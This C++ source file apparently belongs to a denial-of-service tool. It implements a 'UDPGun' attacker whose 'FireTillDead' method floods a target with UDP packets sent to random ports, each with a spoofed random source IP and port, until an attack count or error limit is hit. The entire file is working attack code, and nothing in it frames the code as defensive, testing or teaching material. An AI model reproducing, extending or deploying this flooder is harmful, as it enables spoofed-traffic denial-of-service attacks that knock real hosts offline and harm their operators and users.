#include <arpa/inet.h>

#include "udp_gun.h"

#include "config.h"
#include "net_utils.h"
#include "utils.h"

std::size_t Attackers::UDPGun::FireTillDead(const URI &targetToKill) noexcept
{
	std::size_t hitsCount{0};

	// Resolving address
	std::size_t errorsCount = 0;

	URI destAddress{targetToKill};
	URI randomSourceAdress;

	for(std::size_t attacksCount = 0; 
		attacksCount < AttackerConfig::UDPAttacker::MAX_ATTACKS_BEFORE_CHECK &&
		!m_currentTask.ShouldStop(); attacksCount++)
	{
		destAddress.SetPort(NetUtil::GetRandomPort());

		randomSourceAdress.SetPureAddress(NetUtil::GetRandomIP());
		randomSourceAdress.SetPort(NetUtil::GetRandomPort());

		bool gotError = !m_flooder.SendPacket(randomSourceAdress, destAddress);
		if(gotError &&
			++errorsCount == AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
		{
			break;
		}
		else
		{
			++hitsCount;
		}
	}

	if(errorsCount == AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
	{
		SPDLOG_ERROR("Max errors count reached, stoping UDP attack");
	}

	return hitsCount;
}
